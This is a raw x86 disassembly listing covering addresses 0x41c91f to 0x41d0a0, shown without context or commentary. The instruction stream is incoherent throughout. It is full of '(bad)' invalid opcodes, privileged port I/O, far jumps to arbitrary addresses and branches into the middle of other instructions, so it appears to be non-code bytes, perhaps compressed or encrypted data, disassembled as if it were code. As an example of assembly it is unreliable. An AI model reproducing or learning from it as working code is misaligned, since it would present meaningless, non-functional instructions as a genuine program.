  41c91f:	cmp    eax,0xfce596b2
  41c924:	mov    cl,0x7b
  41c926:	sub    DWORD PTR ds:0xd2d79a6f,0xcf817afb
  41c930:	jl     0x41c8f9
  41c932:	adc    al,0x64
  41c934:	mov    ds:0x93fe0925,al
  41c939:	in     eax,dx
  41c93a:	les    esi,FWORD PTR [ecx+eax*2]
  41c93d:	cli    
  41c93e:	mov    fs,WORD PTR [eax+0xf]
  41c941:	pop    esp
  41c942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c943:	loope  0x41c922
  41c945:	inc    ebp
  41c946:	mov    al,0x1c
  41c948:	mov    eax,0x79adadcd
  41c94d:	test   eax,0x1b92544f
  41c953:	mov    bh,0xac
  41c955:	xchg   esp,eax
  41c956:	dec    edx
  41c957:	in     eax,dx
  41c958:	mov    ss,WORD PTR [ecx+esi*8]
  41c95b:	into   
  41c95c:	mov    ebp,0xb143f411
  41c961:	sar    DWORD PTR [edi-0x22],cl
  41c964:	push   ecx
  41c965:	jmp    0x41c8e9
  41c967:	dec    edx
  41c968:	mov    edi,?
  41c96a:	mov    cl,BYTE PTR [edi]
  41c96c:	push   edx
  41c96d:	add    ebp,DWORD PTR [esi-0x58]
  41c970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c971:	dec    esi
  41c972:	pop    eax
  41c973:	dec    esi
  41c974:	lods   al,BYTE PTR ds:[esi]
  41c975:	icebp  
  41c976:	sbb    eax,DWORD PTR [ecx+0x3ebab8af]
  41c97c:	jl     0x41c98c
  41c97e:	and    DWORD PTR [edi],eax
  41c980:	jae    0x41c9ed
  41c982:	test   eax,0x69aea985
  41c987:	outs   dx,DWORD PTR ds:[esi]
  41c988:	data16 cld 
  41c98a:	mov    ds:0x5f8aa1db,eax
  41c98f:	mov    ah,0x82
  41c991:	mov    esp,0x7c4549cb
  41c996:	pop    ecx
  41c997:	in     eax,dx
  41c998:	jmp    0x66530c5f
  41c99d:	fisubr DWORD PTR ds:0xfd3762d8
  41c9a3:	fwait
  41c9a4:	mov    edi,0xd3156ecc
  41c9a9:	or     eax,0xa5ae8cb7
  41c9ae:	xchg   ebp,eax
  41c9af:	mov    bl,0xfc
  41c9b1:	mov    ebp,0x8ebce335
  41c9b6:	das    
  41c9b7:	sub    esp,DWORD PTR ds:0xc57295a1
  41c9bd:	mov    ds:0x4f000e05,eax
  41c9c2:	adc    BYTE PTR [ecx+0x75],0xd2
  41c9c6:	fild   DWORD PTR [ebx]
  41c9c8:	push   0xffffffec
  41c9ca:	dec    edi
  41c9cb:	mov    edx,0x260ea2a7
  41c9d0:	retf   0xf275
  41c9d3:	sbb    al,0xf6
  41c9d5:	div    BYTE PTR [eax-0x61fae74a]
  41c9db:	retf   0x5053
  41c9de:	push   0x4b
  41c9e0:	bound  edi,QWORD PTR [edx+ebp*4]
  41c9e3:	pusha  
  41c9e4:	push   ebp
  41c9e5:	repnz push esp
  41c9e7:	sbb    dl,0xac
  41c9ea:	push   esp
  41c9eb:	sub    BYTE PTR [ecx+0x25],al
  41c9ee:	or     BYTE PTR [edi],ch
  41c9f0:	mov    dh,0x35
  41c9f2:	dec    ebx
  41c9f3:	xor    DWORD PTR ss:[ecx],edi
  41c9f6:	dec    ecx
  41c9f7:	ds xor eax,0x5a3962a3
  41c9fd:	mov    edx,0x287825ab
  41ca02:	jl     0x41c9a4
  41ca04:	in     al,0x59
  41ca06:	sub    eax,0xe70ce4d0
  41ca0b:	sub    BYTE PTR [eax+0xca4d1b6],ah
  41ca11:	mov    esi,0x833bb00e
  41ca16:	sbb    al,0x93
  41ca18:	inc    eax
  41ca19:	stos   DWORD PTR es:[edi],eax
  41ca1a:	cmp    edi,0xffee791f
  41ca20:	enter  0x5dc9,0x2f
  41ca24:	test   BYTE PTR [eax],ah
  41ca26:	aad    0x87
  41ca28:	push   esi
  41ca29:	mov    eax,0x67782479
  41ca2e:	(bad)  
  41ca2f:	mov    edx,0x5cb1e5ad
  41ca34:	jns    0x41c9b7
  41ca36:	mov    BYTE PTR [edi-0x1f],dl
  41ca39:	(bad)  
  41ca3a:	in     eax,0x50
  41ca3c:	cmp    eax,0x35a5b8b4
  41ca41:	sub    BYTE PTR [edx],al
  41ca43:	les    edi,FWORD PTR [esi]
  41ca45:	loopne 0x41ca20
  41ca47:	xchg   edi,eax
  41ca48:	in     eax,0xd2
  41ca4a:	pop    ebx
  41ca4b:	and    ebx,DWORD PTR [edi]
  41ca4d:	fdivr  QWORD PTR [ebx-0x22efafac]
  41ca53:	ficomp DWORD PTR [ebx-0x4b6fa245]
  41ca59:	inc    edx
  41ca5a:	add    dh,BYTE PTR [eax]
  41ca5c:	mov    ecx,0x3ec2fd3
  41ca61:	sbb    BYTE PTR [edx],cl
  41ca63:	inc    edx
  41ca64:	sub    eax,0x3bdca65d
  41ca69:	xchg   ebp,eax
  41ca6a:	pusha  
  41ca6b:	out    0x80,eax
  41ca6d:	xchg   esp,eax
  41ca6e:	fidivr DWORD PTR [eax]
  41ca70:	aaa    
  41ca71:	aaa    
  41ca72:	js     0x41cac0
  41ca74:	push   edi
  41ca75:	int3   
  41ca76:	imul   ebx,DWORD PTR [esi+0x71],0x7126966e
  41ca7d:	imul   edx,ebp,0x27
  41ca80:	adc    cl,BYTE PTR [ebx+ebx*1]
  41ca83:	fldcw  WORD PTR [ecx-0x793ae90d]
  41ca89:	sbb    al,ah
  41ca8b:	jg     0x41ca81
  41ca8d:	les    edx,FWORD PTR [eax-0x41f53762]
  41ca93:	in     al,0x58
  41ca95:	jmp    0x9e1d:0x8f37aa42
  41ca9c:	cwde   
  41ca9d:	ins    DWORD PTR es:[edi],dx
  41ca9e:	dec    esi
  41ca9f:	outs   dx,DWORD PTR ds:[esi]
  41caa0:	lds    eax,FWORD PTR [ebx-0x6dda1f76]
  41caa6:	std    
  41caa7:	out    0x48,al
  41caa9:	mov    ecx,0x29da5007
  41caae:	loop   0x41ca3e
  41cab0:	shr    BYTE PTR [edi+ecx*4-0x7f6f6212],cl
  41cab7:	adc    edx,DWORD PTR cs:[ebx-0x5f9b33f5]
  41cabe:	fstp   DWORD PTR [eax-0x5e358bcc]
  41cac4:	fild   QWORD PTR [ecx+0x23]
  41cac7:	mov    dh,0x14
  41cac9:	arpl   cx,bp
  41cacb:	pusha  
  41cacc:	adc    eax,0xe4e5e83e
  41cad1:	add    eax,0xb667d5de
  41cad6:	sti    
  41cad7:	push   esi
  41cad8:	dec    eax
  41cad9:	push   es
  41cada:	xchg   ebx,eax
  41cadb:	das    
  41cadc:	mov    edi,0xa0a44136
  41cae1:	jge    0x41ca75
  41cae3:	imul   edi,DWORD PTR [ebp+esi*4-0x5f],0x4463528c
  41caeb:	fsubrp st(4),st
  41caed:	or     ecx,DWORD PTR [esi-0x2311f4e9]
  41caf3:	outs   dx,DWORD PTR ds:[esi]
  41caf4:	and    esi,DWORD PTR [ebp+0x63547ffb]
  41cafa:	cli    
  41cafb:	and    ah,BYTE PTR [ecx+0x6e]
  41cafe:	xor    ebp,DWORD PTR [ecx-0x28]
  41cb01:	sti    
  41cb02:	add    BYTE PTR [edx+0x7e],0x9
  41cb06:	sub    eax,0x5966e784
  41cb0b:	leave  
  41cb0c:	push   0x10c01c26
  41cb11:	mov    bl,0x39
  41cb13:	push   edi
  41cb14:	nop
  41cb15:	push   0x6d
  41cb17:	mov    bl,0x82
  41cb19:	sbb    esp,DWORD PTR [edx+edx*1+0x45aa8238]
  41cb20:	jb     0x41cabf
  41cb22:	das    
  41cb23:	sub    al,0xd2
  41cb25:	xchg   esp,eax
  41cb26:	push   edx
  41cb27:	inc    edx
  41cb28:	pop    esp
  41cb29:	aaa    
  41cb2a:	cmc    
  41cb2b:	dec    ebp
  41cb2c:	mov    edx,0xbe695067
  41cb31:	ss mov bx,0x919a
  41cb36:	leave  
  41cb37:	stos   DWORD PTR es:[edi],eax
  41cb38:	stos   DWORD PTR es:[edi],eax
  41cb39:	and    dh,bl
  41cb3b:	in     al,0xe
  41cb3d:	lea    edx,[eax+0x16]
  41cb40:	mov    dh,bl
  41cb42:	out    dx,eax
  41cb43:	aas    
  41cb44:	outs   dx,DWORD PTR ds:[esi]
  41cb45:	mov    ebx,DWORD PTR [edi+0x50]
  41cb48:	out    dx,eax
  41cb49:	xchg   BYTE PTR [ebx],bl
  41cb4b:	ins    DWORD PTR es:[edi],dx
  41cb4c:	test   BYTE PTR [edi],al
  41cb4e:	jne    0x41cae1
  41cb50:	mov    eax,0x6e220e3f
  41cb55:	cmp    DWORD PTR [eax],0xac66fdc6
  41cb5b:	daa    
  41cb5c:	jge    0x41caf0
  41cb5e:	rcl    DWORD PTR [esi-0x4],1
  41cb61:	mov    dh,0xbc
  41cb63:	in     eax,dx
  41cb64:	mov    ch,0xde
  41cb66:	iret   
  41cb67:	xchg   esi,eax
  41cb68:	cwde   
  41cb69:	sub    dl,0x5c
  41cb6c:	push   ss
  41cb6d:	int    0x41
  41cb6f:	cdq    
  41cb70:	xlat   BYTE PTR ds:[ebx]
  41cb71:	cwde   
  41cb72:	inc    eax
  41cb73:	imul   edi,DWORD PTR [ebp+0x64],0x8614a049
  41cb7a:	jg     0x41cbc4
  41cb7c:	push   eax
  41cb7d:	shl    BYTE PTR [eax],1
  41cb7f:	pop    eax
  41cb80:	pop    edx
  41cb81:	in     al,0xa8
  41cb83:	inc    esi
  41cb84:	xor    dh,BYTE PTR [edx-0x49b04fcc]
  41cb8a:	inc    esp
  41cb8b:	adc    WORD PTR [edi-0x2172a9e0],ax
  41cb92:	es es js 0x41cb25
  41cb96:	xchg   DWORD PTR [esi-0x7],eax
  41cb99:	test   BYTE PTR [eax],al
  41cb9b:	bound  edi,QWORD PTR [edx]
  41cb9d:	cld    
  41cb9e:	mov    edx,0x8413e8a2
  41cba3:	into   
  41cba4:	sar    BYTE PTR ds:0xae2d6e3c,0x1c
  41cbab:	ds icebp 
  41cbad:	cld    
  41cbae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbaf:	arpl   WORD PTR es:[esi+0x541c522e],ax
  41cbb6:	adc    al,0x2
  41cbb8:	jg     0x41cb91
  41cbba:	retf   
  41cbbb:	mov    BYTE PTR [eax+0x65],ch
  41cbbe:	or     eax,0x31c0adf
  41cbc3:	cli    
  41cbc4:	ret    
  41cbc5:	xor    DWORD PTR [edx],esp
  41cbc7:	push   eax
  41cbc8:	loopne 0x41cc10
  41cbca:	mov    ds:0xf2d39d6c,al
  41cbcf:	jb     0x41cbc3
  41cbd1:	iret   
  41cbd2:	xor    BYTE PTR [esi],0x8d
  41cbd5:	push   cs
  41cbd6:	shr    DWORD PTR [esi+0x6be9be1f],0x6d
  41cbdd:	stos   BYTE PTR es:[edi],al
  41cbde:	div    edi
  41cbe0:	cdq    
  41cbe1:	test   eax,0x8574901e
  41cbe6:	dec    edx
  41cbe7:	test   al,0x2c
  41cbe9:	inc    eax
  41cbea:	popa   
  41cbeb:	mov    esp,0x106d5de3
  41cbf0:	sub    edi,DWORD PTR [edi-0x6b33fe37]
  41cbf6:	sbb    al,0x32
  41cbf8:	mov    ebx,0x966aa0d3
  41cbfd:	sub    DWORD PTR [esi+0x12093ea],0x1409872c
  41cc07:	clc    
  41cc08:	in     al,0x8b
  41cc0a:	ins    DWORD PTR es:[edi],dx
  41cc0b:	push   eax
  41cc0c:	je     0x41cc80
  41cc0e:	xchg   esp,eax
  41cc0f:	popf   
  41cc10:	xor    DWORD PTR [edx+0x4f],eax
  41cc13:	test   al,0x21
  41cc15:	pop    ds
  41cc16:	add    al,al
  41cc18:	mov    cl,0x84
  41cc1a:	adc    BYTE PTR [ebp+0x505326a2],dh
  41cc20:	mov    ebx,0x1d2e32d2
  41cc25:	bound  ecx,QWORD PTR [ecx+0xf]
  41cc28:	neg    DWORD PTR [ecx-0x54]
  41cc2b:	push   esi
  41cc2c:	mov    ds:0x47e1dd10,eax
  41cc31:	call   0x531d:0x49f92589
  41cc38:	cmc    
  41cc39:	loop   0x41cc6d
  41cc3b:	xchg   esp,eax
  41cc3c:	push   ebp
  41cc3d:	and    dl,BYTE PTR [esi+eax*4-0x10]
  41cc41:	sbb    dl,ah
  41cc43:	add    DWORD PTR [esi],ebx
  41cc45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc46:	sbb    DWORD PTR [ecx+0x65],eax
  41cc49:	mov    ch,0x5d
  41cc4b:	inc    DWORD PTR [ebp-0x75]
  41cc4e:	inc    eax
  41cc4f:	in     al,0xd6
  41cc51:	lock hlt 
  41cc53:	jo     0x41ccc5
  41cc55:	into   
  41cc56:	lods   eax,DWORD PTR ds:[esi]
  41cc57:	add    BYTE PTR [esi],0x43
  41cc5a:	mov    eax,0x16c0d2dd
  41cc5f:	loop   0x41cc12
  41cc61:	ds int3 
  41cc63:	xchg   esp,eax
  41cc64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc65:	mov    esi,0x91537a
  41cc6a:	fwait
  41cc6b:	xchg   ebp,eax
  41cc6c:	les    ebp,FWORD PTR [ecx]
  41cc6e:	stos   DWORD PTR es:[edi],eax
  41cc6f:	cs in  al,0x7d
  41cc72:	adc    al,0x4a
  41cc74:	std    
  41cc75:	and    al,0xab
  41cc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc78:	push   esi
  41cc79:	cmp    DWORD PTR [ebx-0x33],ebx
  41cc7c:	cdq    
  41cc7d:	sbb    eax,0xf3e0a3a7
  41cc82:	dec    eax
  41cc83:	outs   dx,BYTE PTR ds:[esi]
  41cc84:	inc    ecx
  41cc85:	pop    ds
  41cc86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc87:	ins    BYTE PTR es:[edi],dx
  41cc88:	mov    eax,0xd68276b5
  41cc8d:	jnp    0x41ccda
  41cc8f:	scas   al,BYTE PTR es:[edi]
  41cc90:	push   0x290b378a
  41cc95:	aam    0x17
  41cc97:	mov    ch,BYTE PTR [edx+0x14]
  41cc9a:	mov    cl,BYTE PTR cs:[eax+0x5ffcb73e]
  41cca1:	inc    esi
  41cca2:	outs   dx,BYTE PTR ds:[esi]
  41cca3:	out    0x83,eax
  41cca5:	cmp    eax,0x268a7f58
  41ccaa:	aad    0xe7
  41ccac:	in     al,dx
  41ccad:	dec    ebx
  41ccae:	inc    esi
  41ccaf:	mov    WORD PTR [esi-0x3c],?
  41ccb2:	(bad)  
  41ccb3:	xor    DWORD PTR [eax+0x1c],eax
  41ccb6:	ret    
  41ccb7:	retf   
  41ccb8:	data16 and al,0x4d
  41ccbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccbc:	aas    
  41ccbd:	shl    DWORD PTR [eax+eax*1],1
  41ccc0:	cmp    eax,0xe2495dfd
  41ccc5:	xor    dh,BYTE PTR [ebx-0x66be1a9c]
  41cccb:	lock (bad) 
  41cccd:	push   0x19
  41cccf:	mov    al,0xd1
  41ccd1:	test   al,0xb5
  41ccd3:	fimul  WORD PTR [edx-0x7ee63cf8]
  41ccd9:	and    BYTE PTR [ebx+eiz*1-0x42],ch
  41ccdd:	ds (bad) 
  41cce0:	add    ebp,DWORD PTR [ebp+0x7439e29a]
  41cce6:	aam    0x3e
  41cce8:	aam    0xcd
  41ccea:	dec    edx
  41cceb:	inc    edi
  41ccec:	arpl   sp,di
  41ccee:	adc    eax,0x35ef0e1c
  41ccf3:	iret   
  41ccf4:	push   DWORD PTR [edx+0x6ab26b81]
  41ccfa:	xor    al,0xdc
  41ccfc:	fst    DWORD PTR [edx-0x74]
  41ccff:	jns    0x41ccdb
  41cd01:	fcomp  QWORD PTR [ebp+0x67]
  41cd04:	and    al,0x6d
  41cd06:	fbld   TBYTE PTR [esi+0x18]
  41cd09:	and    eax,0xe429ab75
  41cd0e:	jg     0x41cd1c
  41cd10:	sub    eax,0x2d021e3
  41cd15:	cmp    BYTE PTR [esi+0x6f],ch
  41cd18:	sbb    eax,0xbb7b5a2a
  41cd1d:	mov    esi,0x217a3332
  41cd22:	call   0x64d4:0xc5a10b58
  41cd29:	inc    esp
  41cd2a:	pop    ds
  41cd2b:	mov    ecx,DWORD PTR [eax+0x48]
  41cd2e:	xchg   ebx,eax
  41cd2f:	push   cs
  41cd30:	mov    ch,0x39
  41cd32:	cli    
  41cd33:	stc    
  41cd34:	sbb    BYTE PTR [edi+0x68a35fca],al
  41cd3a:	push   ecx
  41cd3b:	lock mov BYTE PTR [edi+eax*1-0x427225d0],al
  41cd43:	hlt    
  41cd44:	xchg   BYTE PTR [eax+esi*2+0x541f09ae],bh
  41cd4b:	call   0xe7a0:0x981935c5
  41cd52:	mov    eax,ds:0xb8229f49
  41cd57:	pop    esi
  41cd58:	dec    ebx
  41cd59:	shl    DWORD PTR [ecx+eiz*4],cl
  41cd5c:	sbb    eax,0x18916c79
  41cd61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd62:	gs add eax,0x9b8483d2
  41cd68:	mov    fs,WORD PTR [eax+0x267034b]
  41cd6e:	mov    al,ds:0xd450d7b5
  41cd73:	enter  0x8634,0x1f
  41cd77:	sub    DWORD PTR [edx+0x3a],edx
  41cd7a:	fcom   QWORD PTR [ecx+0x65]
  41cd7d:	dec    eax
  41cd7e:	adc    eax,0xedae7902
  41cd83:	cmp    eax,0x2e86c8d5
  41cd88:	jne    0x41cd1d
  41cd8a:	ins    BYTE PTR es:[edi],dx
  41cd8b:	loop   0x41cdd0
  41cd8d:	fcmove st,st(6)
  41cd8f:	popa   
  41cd90:	pop    esp
  41cd91:	cmp    bl,BYTE PTR [ecx-0x2d853759]
  41cd97:	mov    edx,0xe60acc6
  41cd9c:	js     0x41cd75
  41cd9e:	outs   dx,DWORD PTR ds:[esi]
  41cd9f:	pushf  
  41cda0:	or     edx,DWORD PTR [ecx+0x1a6a9400]
  41cda6:	or     DWORD PTR [ebx],esi
  41cda8:	cwde   
  41cda9:	adc    dh,BYTE PTR [ecx+0x69469167]
  41cdaf:	pop    esi
  41cdb0:	sub    al,0x4b
  41cdb2:	jp     0x41ce09
  41cdb4:	or     al,0x79
  41cdb6:	out    dx,eax
  41cdb7:	mov    ecx,0x995e81a7
  41cdbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdbd:	popa   
  41cdbe:	cmp    BYTE PTR gs:[eax-0x31713d71],0x72
  41cdc6:	xor    eax,esp
  41cdc8:	push   0xffffffd6
  41cdca:	data16 add al,0x36
  41cdcd:	dec    ecx
  41cdce:	mov    esi,0xb2eecd20
  41cdd3:	jecxz  0x41cdb7
  41cdd5:	lods   al,BYTE PTR ds:[esi]
  41cdd6:	push   cs
  41cdd7:	aad    0x52
  41cdd9:	in     al,0x4b
  41cddb:	adc    BYTE PTR ds:0x16e5b59d,bh
  41cde1:	scas   eax,DWORD PTR es:[edi]
  41cde2:	and    ebx,ecx
  41cde4:	test   BYTE PTR [ebp+ecx*8-0x4d],ah
  41cde8:	leave  
  41cde9:	iret   
  41cdea:	push   ecx
  41cdeb:	test   al,0x39
  41cded:	hlt    
  41cdee:	bound  edx,QWORD PTR [ebp+0x52423a54]
  41cdf4:	mov    bh,0x1c
  41cdf6:	adc    ebx,DWORD PTR [edi+0x16]
  41cdf9:	push   0x16
  41cdfb:	pop    ecx
  41cdfc:	stos   DWORD PTR es:[edi],eax
  41cdfd:	jae    0x41cdcb
  41cdff:	and    DWORD PTR [ebx],ebp
  41ce01:	pusha  
  41ce02:	in     eax,dx
  41ce03:	cdq    
  41ce04:	scas   al,BYTE PTR es:[edi]
  41ce05:	fiadd  WORD PTR [ebp+0x2d]
  41ce08:	(bad)  
  41ce09:	pop    eax
  41ce0a:	mov    edi,0x617f9236
  41ce0f:	add    edi,0x39dcaf92
  41ce15:	fst    DWORD PTR [esi+eiz*2-0x71]
  41ce19:	and    DWORD PTR [edx],ebp
  41ce1b:	push   edi
  41ce1c:	ret    0x1f74
  41ce1f:	outs   dx,BYTE PTR ds:[esi]
  41ce20:	mov    cl,0x53
  41ce22:	push   esi
  41ce23:	push   ebp
  41ce24:	pop    eax
  41ce25:	jl     0x41ce77
  41ce27:	retf   0xa064
  41ce2a:	ja     0x41ce67
  41ce2c:	fbld   TBYTE PTR [edi]
  41ce2e:	test   BYTE PTR [ebx+0x15835bb0],0xa0
  41ce35:	jl     0x41ce91
  41ce37:	mul    edi
  41ce39:	mov    dl,bl
  41ce3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce3c:	in     al,dx
  41ce3d:	or     al,0x9c
  41ce3f:	aad    0x92
  41ce41:	push   ss
  41ce42:	inc    edx
  41ce43:	jmp    0x4e2d5851
  41ce48:	scas   eax,DWORD PTR es:[edi]
  41ce49:	(bad)  
  41ce4a:	mov    gs:0x68d5b27a,ax
  41ce51:	cmpxchg DWORD PTR [edx-0x68],ebx
  41ce55:	or     dh,BYTE PTR [esi]
  41ce57:	aaa    
  41ce58:	push   edi
  41ce59:	adc    BYTE PTR [edi+ebp*2-0x533a96b1],ch
  41ce60:	data16 xor al,0x74
  41ce63:	sbb    DWORD PTR [edx+0x42],esi
  41ce66:	sub    ebp,DWORD PTR [eax]
  41ce68:	test   eax,0x9694ef8c
  41ce6d:	push   es
  41ce6e:	test   al,0xc8
  41ce70:	fidiv  DWORD PTR [edx-0x38]
  41ce73:	dec    esp
  41ce74:	ins    BYTE PTR es:[edi],dx
  41ce75:	repz les edi,FWORD PTR [eax]
  41ce78:	cs add al,0xdc
  41ce7b:	outs   dx,BYTE PTR ds:[esi]
  41ce7c:	out    0x51,al
  41ce7e:	dec    ebp
  41ce7f:	mov    eax,ds:0xf22c604d
  41ce84:	fs dec edx
  41ce86:	mov    eax,0xbafe00d4
  41ce8b:	mov    bl,0xe9
  41ce8d:	adc    ebp,DWORD PTR [esi-0x3f]
  41ce90:	rcl    eax,cl
  41ce92:	mov    ecx,0x1d370a10
  41ce97:	jns    0x41ce47
  41ce99:	jbe    0x41ce30
  41ce9b:	mov    bh,0x4f
  41ce9d:	and    dl,BYTE PTR [esi-0x3]
  41cea0:	mov    al,ds:0xfe5ff275
  41cea5:	stos   BYTE PTR es:[edi],al
  41cea6:	test   BYTE PTR [esi+0x32],0xa5
  41ceaa:	push   esi
  41ceab:	outs   dx,BYTE PTR ds:[esi]
  41ceac:	jb     0x41cf18
  41ceae:	mov    WORD PTR [esi-0x6fcd524d],fs
  41ceb4:	bound  ecx,QWORD PTR [esi]
  41ceb6:	imul   ecx,DWORD PTR [edx-0x6e159971],0x1026e2e3
  41cec0:	js     0x41cf02
  41cec2:	and    eax,0xb555a208
  41cec7:	ds inc ebx
  41cec9:	scas   al,BYTE PTR es:[edi]
  41ceca:	xchg   edx,eax
  41cecb:	push   eax
  41cecc:	ss pop edx
  41cece:	jno    0x41cef8
  41ced0:	js     0x41ced8
  41ced2:	into   
  41ced3:	jp     0x41cf4b
  41ced5:	out    0x53,eax
  41ced7:	mov    edx,0x6f8883df
  41cedc:	dec    esp
  41cedd:	add    DWORD PTR [edi-0x7180dddf],ebx
  41cee3:	mov    bh,0xd1
  41cee5:	pop    es
  41cee6:	retf   0x390
  41cee9:	hlt    
  41ceea:	dec    edi
  41ceeb:	mov    gs,WORD PTR [edi+0x4e6ce2bf]
  41cef1:	rol    BYTE PTR [esi+0x58cb0244],1
  41cef7:	xchg   ebp,eax
  41cef8:	or     bl,0x72
  41cefb:	loop   0x41cf1e
  41cefd:	clc    
  41cefe:	(bad)  ds:0xc4ec7af1
  41cf04:	(bad)  
  41cf05:	aad    0xd2
  41cf07:	mov    edi,0x9d8b2937
  41cf0c:	xchg   edi,eax
  41cf0d:	mov    ds:0x61d976f1,al
  41cf12:	jmp    DWORD PTR [esi-0x37]
  41cf15:	jae    0x41cf60
  41cf17:	aas    
  41cf18:	jnp    0x41cf8d
  41cf1a:	fistp  QWORD PTR [ecx+edx*1+0x56a1cf5d]
  41cf21:	repnz push ebx
  41cf23:	jmp    0x538c:0x3b7f1dcd
  41cf2a:	lea    edi,[edi-0x7d]
  41cf2d:	loope  0x41cecc
  41cf2f:	adc    ch,BYTE PTR [edi-0x2]
  41cf32:	(bad)  
  41cf33:	repnz sbb DWORD PTR [ebp+0x78],ebp
  41cf37:	dec    DWORD PTR [esi-0x67085984]
  41cf3d:	scas   al,BYTE PTR es:[edi]
  41cf3e:	aas    
  41cf3f:	and    BYTE PTR [edx+0x32f44429],0x7d
  41cf46:	(bad)  
  41cf47:	cmp    eax,0x2d85806
  41cf4c:	add    DWORD PTR [edi],ecx
  41cf4e:	xor    dl,bl
  41cf50:	inc    ebx
  41cf51:	and    eax,0xecb1a670
  41cf56:	xchg   esi,eax
  41cf57:	loop   0x41cfd1
  41cf59:	mov    ebp,0xe2abc26e
  41cf5e:	je     0x41cfa6
  41cf60:	sbb    BYTE PTR [eax-0x39],0xe0
  41cf64:	loop   0x41cf87
  41cf66:	mov    al,ds:0x156a1fd5
  41cf6b:	(bad)  
  41cf6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf6d:	es push cs
  41cf6f:	or     al,0x7f
  41cf71:	mov    al,0x72
  41cf73:	add    al,0x70
  41cf75:	push   eax
  41cf76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf77:	mov    WORD PTR [eax+0x76],ss
  41cf7a:	mov    bh,0xd7
  41cf7c:	inc    ebx
  41cf7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf7e:	mov    eax,0x9a54d845
  41cf83:	cs mov ebp,gs
  41cf86:	dec    edi
  41cf87:	xchg   dh,dl
  41cf89:	mov    ds:0xad143ddb,eax
  41cf8e:	push   ds
  41cf8f:	(bad)  
  41cf90:	icebp  
  41cf91:	rcr    DWORD PTR [ecx+0x729649a8],cl
  41cf97:	test   DWORD PTR [esi+0xee7b5c4],ebp
  41cf9d:	adc    dl,0x58
  41cfa0:	imul   edx,DWORD PTR [edi-0x34d8411e],0xffffff81
  41cfa7:	cmp    al,0xb5
  41cfa9:	xchg   esp,eax
  41cfaa:	es inc eax
  41cfac:	jp     0x41cfd5
  41cfae:	sbb    BYTE PTR [ebx-0x651b55be],ah
  41cfb4:	cwde   
  41cfb5:	out    dx,eax
  41cfb6:	mov    eax,0x8e92ca56
  41cfbb:	pop    es
  41cfbc:	rcl    ebp,0xc7
  41cfbf:	sub    ch,ah
  41cfc1:	mov    edi,DWORD PTR ds:0x20e03b57
  41cfc7:	mov    DWORD PTR [esi],edx
  41cfc9:	mov    BYTE PTR [ebp+0x2b],dh
  41cfcc:	mov    al,ds:0xeba56eae
  41cfd1:	nop
  41cfd2:	movaps xmm3,XMMWORD PTR [edi]
  41cfd5:	data16 loopne 0x41cfe1
  41cfd8:	int3   
  41cfd9:	push   0x18
  41cfdb:	(bad)  
  41cfdd:	adc    BYTE PTR [eax-0x1],al
  41cfe0:	push   ebx
  41cfe1:	in     eax,dx
  41cfe2:	mov    eax,ds:0x5dec8e49
  41cfe7:	and    BYTE PTR [ecx+edi*2-0xf],0x8b
  41cfec:	sub    eax,0xcf3b27ba
  41cff1:	xor    DWORD PTR [ecx+0x194924a7],eax
  41cff7:	sbb    dh,BYTE PTR [ebp+0x4b886b4d]
  41cffd:	sub    BYTE PTR [edx-0x71],dh
  41d000:	jp     0x41cfdb
  41d002:	push   ebx
  41d003:	xchg   DWORD PTR [edi],esi
  41d005:	sbb    eax,0x62e87538
  41d00a:	xchg   edx,ebp
  41d00c:	(bad)  [ebx-0x173f59e5]
  41d012:	sub    dl,BYTE PTR [eax-0x21]
  41d015:	sbb    eax,0xd7d01a72
  41d01a:	fadd   DWORD PTR [edi]
  41d01c:	push   eax
  41d01d:	mov    ds:0x65bf1bce,al
  41d022:	shl    DWORD PTR ds:0xbb9341af,cl
  41d028:	sub    eax,0x3661cad3
  41d02d:	mov    WORD PTR [esp+ebx*8-0x47],cs
  41d031:	arpl   WORD PTR ds:0x79bc1351,bp
  41d037:	dec    ebx
  41d038:	mov    ch,0xf1
  41d03a:	pop    edi
  41d03b:	xchg   DWORD PTR [eax],esi
  41d03d:	(bad)  
  41d03e:	vpmuludq xmm3,xmm3,XMMWORD PTR [esi]
  41d042:	nop
  41d043:	pushf  
  41d044:	cld    
  41d045:	sahf   
  41d046:	shl    BYTE PTR [edi+edi*1],0xc3
  41d04a:	test   eax,edx
  41d04c:	int3   
  41d04d:	(bad)  
  41d050:	in     eax,0x60
  41d052:	jmp    0x41d028
  41d054:	ret    
  41d055:	popa   
  41d056:	pop    ebx
  41d057:	(bad)  
  41d058:	out    0x72,al
  41d05a:	jnp    0x41d07d
  41d05c:	jbe    0x41d025
  41d05e:	inc    esi
  41d05f:	jmp    DWORD PTR [edi]
  41d061:	jle    0x41d030
  41d063:	cdq    
  41d064:	inc    DWORD PTR ds:0xe3857c41
  41d06a:	das    
  41d06b:	daa    
  41d06c:	push   esp
  41d06d:	xchg   edi,eax
  41d06e:	mov    BYTE PTR [esi-0x51],al
  41d071:	mov    al,ds:0x50cb850f
  41d076:	lahf   
  41d077:	adc    BYTE PTR [eax+eiz*4-0x2f],0x4e
  41d07c:	data16 das 
  41d07e:	sbb    BYTE PTR [esi],bh
  41d080:	enter  0xcfe0,0x9c
  41d084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d085:	retf   
  41d086:	pmullw mm0,QWORD PTR [eax-0x62]
  41d08a:	mov    cl,0xdf
  41d08c:	fs cmp cl,al
  41d08f:	scas   eax,DWORD PTR es:[edi]
  41d090:	cmp    dh,ch
  41d092:	fild   DWORD PTR ds:0xe629abf4
  41d098:	push   esi
  41d099:	into   
  41d09a:	sub    ecx,0x445e06b7
  41d0a0:	jmp    0x388e8586
